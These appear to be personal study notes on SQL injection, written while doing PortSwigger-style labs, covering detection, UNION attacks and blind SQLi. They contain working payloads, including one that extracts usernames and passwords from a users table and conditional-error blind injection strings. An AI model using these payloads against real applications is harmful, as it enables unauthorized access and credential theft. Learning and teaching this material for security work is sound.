#  How to detect SQLi vul
- The single quote character ' and look for error or other anomalies
- Boolean conditions such as OR 1=1 and OR 1=2, and look for differences in the app's response
- Payload designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond

# Common locations where SQLi arises:
- In UPDATE statements, within the updated values or the WHERE clause
- In INSERT statements, within the inserted values
- In SELECT statements, within the table or column name
- In SELECT statements, within the ORDER BY clause

# SQLi examples
- Retriveving hidden data: <lab1.md> 
- Subverting application logic: <lab2.md>
- Retrieving data from other database tables
- Blind SQLi vul

# SQLi UNION attacks
- Example:
    SELECT a, b FROM table1 UNION SELECT c, d FROM table2
- For a UNION query to work, 2 key requirements must be met:
    + The individual queries must return the same number of columns
    + The data types in each column must be compatible between the individual queries

- Determining the number of columns required
    + injecting a series of ORDER BY: ' ORDER BY 1-, ' ORDER BY 2-- ect.
    The column in an ORDER BY clause can be specified by its index, so we dont need to know the names of any columns. When the index exceeds the number of actual columns, the database returns an error, such as:
    The ORDER BY position number 3 is out of range of the number of items in the select list.
    + Submitting a series of INION SELECT payloads specifying a different number of null values: ' UNION SELECT NULL--, ' UNION SELECT NULL,NULL-- ect.
    If the number of nulls does not match the number of columns, the database returns an error.
    + LAB3: <lab3.md>

- Database-specific syntax
    SQLi cheet sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet

- Finding columns with a useful data type:
Use ' UNION SELECT 'a',NULL,NULL,NULL-- to determine which columns has string data type
LAB: <lab4.md>

- Using a SQL injection UNION attack to retrieve interesting data <lab5.md>
- Retrieving multiple values within a single column
    ' UNION SELECT username || '~' || password FROM users--

Lab6: figure out that can use this syntax: ' UNION SELECT NULL,username FROM users--
so use this to find out credetial        : ' UNION SELECT NULL,username || '~' || password FROM users--

# Blind SQL injection
- Exploiting blind SQLi by triggering conditional responses: <lab7.md>

- Exploiting blind SQLi by triggering conditional errors: <lab8.md>
    xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
    xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a